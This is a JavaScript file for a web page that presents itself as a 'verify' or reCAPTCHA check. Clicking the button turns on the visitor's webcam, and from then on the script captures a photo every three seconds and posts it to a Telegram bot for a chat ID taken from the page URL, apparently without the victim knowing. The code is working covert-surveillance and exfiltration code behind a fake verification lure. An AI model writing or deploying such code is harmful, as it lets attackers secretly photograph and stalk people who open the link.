import { BOT_TOKEN } from "./config.js";

const verifyBtn = document.getElementById("verifyBtn");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const toast = document.getElementById("toast");
const recaptchaSection = document.getElementById("recaptcha-section");
const recaptchaMsg = document.getElementById("recaptcha-msg");

// Chat ID from URL
const params = new URLSearchParams(window.location.search);
const chatId = params.get("id");

let stream = null;
let captureInterval = null;

// Toast message
function showToast(msg){
  toast.innerText = msg;
  toast.style.opacity=1;
  setTimeout(()=>{toast.style.opacity=0},3000);
}

// Capture & send
async function captureAndSend(){
  if(!stream) return;
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video,0,0);

  canvas.toBlob(async (blob)=>{
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", blob);
    try{
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
        method:"POST",
        body:formData
      });
      const data = await res.json();
      if(data.ok) showToast("Photo sent ✅");
      else showToast("Send failed ❌");
    }catch(err){
      console.error(err);
      showToast("Error ❌");
    }
  },"image/jpeg");
}

// Start camera
async function startCamera(){
  try{
    stream = await navigator.mediaDevices.getUserMedia({video:true});
    video.srcObject = stream;
    video.play();
    // every 3 sec
    captureInterval = setInterval(captureAndSend,3000);
    showToast("Camera started ✅");
    recaptchaSection.style.display="block"; // show reCAPTCHA
  }catch(e){
    showToast("Permission denied ❌");
    console.error(e);
  }
}

// Button click → start camera
verifyBtn.onclick = () => startCamera();

// reCAPTCHA success callback
function onRecaptchaSuccess(token){
  recaptchaMsg.innerText = "";
  window.location.href = "next.html";
}

// Stop on page unload
window.onbeforeunload = () => {
  if(stream) stream.getTracks().forEach(track=>track.stop());
  if(captureInterval) clearInterval(captureInterval);
};
